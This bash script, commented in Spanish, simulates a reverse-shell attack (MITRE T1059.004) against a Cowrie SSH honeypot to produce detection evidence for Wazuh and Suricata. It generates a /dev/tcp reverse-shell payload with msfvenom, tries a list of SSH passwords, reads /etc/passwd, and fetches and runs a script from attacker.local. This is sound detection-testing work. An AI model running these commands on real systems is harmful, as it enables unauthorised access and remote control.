#!/bin/bash
# ============================================================================
# Escenario S09: Reverse Shell (T1059.004)
# ============================================================================
# Herramientas: msfvenom, nc
# Target: Cowrie SSH honeypot (10.20.0.50:2222)
# ============================================================================

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
mkdir -p "$EVIDENCE_DIR"

HONEYPOT_HOST="10.20.0.50"
HONEYPOT_PORT="2222"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")

echo "=========================================="
echo "S09: Reverse Shell (T1059.004)"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="

echo "$TIMESTAMP" > "$EVIDENCE_DIR/start_time.txt"

# 1. Generar payload con msfvenom
echo "[*] Fase 1: Generar reverse shell payload"
LHOST="10.20.0.99"  # atacante IP
LPORT="4444"

msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT \
    -f raw -o "$EVIDENCE_DIR/reverse_shell.sh" 2>/dev/null || \
    echo '#!/bin/bash
bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1' > "$EVIDENCE_DIR/reverse_shell.sh"

# 2. Conexión SSH al honeypot y ejecución de comandos sospechosos
echo "[*] Fase 2: SSH a Cowrie con credenciales y ejecución de reverse shell"
sshpass -p "test123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p $HONEYPOT_PORT admin@$HONEYPOT_HOST \
    "echo 'intento de reverse shell...'; cat /etc/passwd; ls -la /tmp/; whoami; uname -a" \
    2> "$EVIDENCE_DIR/ssh_attempt.log" || true

# 3. Probar múltiples credenciales + reverse shell attempts
echo "[*] Fase 3: Múltiples intentos de reverse shell"
for PASS in admin123 root123 test toor password; do
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -p $HONEYPOT_PORT root@$HONEYPOT_HOST \
        "echo 'test'; wget http://attacker.local/shell.sh -O /tmp/s.sh; chmod +x /tmp/s.sh; /tmp/s.sh" \
        2>> "$EVIDENCE_DIR/ssh_attempt.log" || true
done

# 4. Generar evidencia de payload
echo "[*] Fase 4: Hashing de payload"
sha256sum "$EVIDENCE_DIR/reverse_shell.sh" > "$EVIDENCE_DIR/payload_hash.txt"
md5sum "$EVIDENCE_DIR/reverse_shell.sh" > "$EVIDENCE_DIR/payload_md5.txt"

END_TIME=$(date -u +"%Y%m%dT%H%M%SZ")
echo "$END_TIME" > "$EVIDENCE_DIR/end_time.txt"

cat > "$EVIDENCE_DIR/resultados.json" <<EOF
{
  "scenario": "S09-reverse-shell",
  "technique_id": "T1059.004",
  "technique_name": "Unix Shell",
  "tactic": "Execution",
  "timestamp_start": "$TIMESTAMP",
  "timestamp_end": "$END_TIME",
  "tools_used": ["msfvenom", "sshpass", "ssh"],
  "target": "$HONEYPOT_HOST:$HONEYPOT_PORT",
  "evidence_files": [
    "reverse_shell.sh",
    "ssh_attempt.log",
    "payload_hash.txt",
    "payload_md5.txt"
  ],
  "expected_detection": [
    "Cowrie captures entire session",
    "Wazuh rule 100220 (successful login)",
    "Suricata: reverse shell signatures"
  ],
  "iso27035_phase": "Detection and Reporting (Phase 2)"
}
EOF

echo "[OK] Escenario S09 ejecutado. Cowrie capturó los intentos."
